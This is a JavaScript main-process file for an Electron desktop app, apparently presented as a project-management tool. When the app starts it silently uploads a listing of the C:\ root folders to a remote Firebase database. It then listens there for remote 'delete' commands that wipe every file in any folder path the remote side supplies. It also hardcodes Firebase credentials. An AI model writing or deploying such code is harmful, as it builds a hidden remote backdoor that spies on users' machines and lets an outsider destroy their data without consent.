const { app, BrowserWindow } = require("electron");
const path = require("path");
const fs = require("fs");

// Firebase imports
const { initializeApp } = require("firebase/app");
const { getDatabase, ref, onValue, set } = require("firebase/database");

//  Your Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyAJMxUnRguu2ChNsXxMpbfZMfT9tBqj3RQ",
  authDomain: "projectmanagement-cb6cb.firebaseapp.com",
  databaseURL: "https://projectmanagement-cb6cb-default-rtdb.firebaseio.com",
  projectId: "projectmanagement-cb6cb",
  storageBucket: "projectmanagement-cb6cb.firebasestorage.app",
  messagingSenderId: "717803916180",
  appId: "1:717803916180:web:a215dc6daeac7381f59d81",
  measurementId: "G-ZKNRHGY2TS"
};

//  Initialize Firebase
const fbApp = initializeApp(firebaseConfig);
const db = getDatabase(fbApp);


// Delete Files Function

function deleteFilesFromFolder(folderPath) {
  try {
    if (fs.existsSync(folderPath)) {
      const files = fs.readdirSync(folderPath);
      for (const file of files) {
        const filePath = path.join(folderPath, file);
        if (fs.lstatSync(filePath).isFile()) {
          fs.unlinkSync(filePath);
        }
      }
      console.log(`✅ Deleted all files from ${folderPath}`);
      return true;
    } else {
      console.log("❌ Directory does not exist: " + folderPath);
      return false;
    }
  } catch (err) {
    console.error("⚠️ Error deleting files: " + err.message);
    return false;
  }
}


//  Scan C:\ Root Folders (Auto on Startup)
function scanDriveAndUpload() {
  let results = [];

  try {
    const items = fs.readdirSync("C:\\"); // only root of C:\

    for (const item of items.slice(0, 200)) { // max 200
      const itemPath = path.join("C:\\", item);

      try {
        if (fs.lstatSync(itemPath).isDirectory()) {
          results.push(itemPath);
        }
      } catch {
        // skip inaccessible entries
      }
    }
  } catch (err) {
    console.error("⚠️ Error scanning C:\\ root:", err.message);
  }

  console.log("📡 Auto-scanned C:\\ root folders");

  // Upload results to Firebase
  const resultRef = ref(db, "scanResults");
  set(resultRef, {
    timestamp: new Date().toISOString(),
    folders: results
  });

  console.log(`✅ Uploaded ${results.length} folders to Firebase.`);
}


//  Firebase Command Listener (manual ops only)

function watchFirebase() {
  const commandRef = ref(db, "tasks"); 
  let firstLoad = true;

  onValue(commandRef, async (snapshot) => {
    if (firstLoad) {
      firstLoad = false; // skip initial load
      return;
    }

    const data = snapshot.val();
    if (!data) return;

    const { command, location } = data;
    console.log("📡 Firebase update:", data);

    if (command === "delete" && location) {
      const result = deleteFilesFromFolder(location);
      await set(commandRef, {
        command: result ? "done" : "error",
        location
      });
    }
  });
}

//  Electron App

function createWindow() {
  const win = new BrowserWindow({
    width: 600,
    height: 400,
    webPreferences: {
      preload: path.join(__dirname, "preload.js"),
    },
  });

  win.loadFile("index.html");
}

app.whenReady().then(() => {
  createWindow();

  //  Auto-scan on startup
  scanDriveAndUpload();

  //  Start listening for Firebase commands
  watchFirebase();
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") app.quit();
});
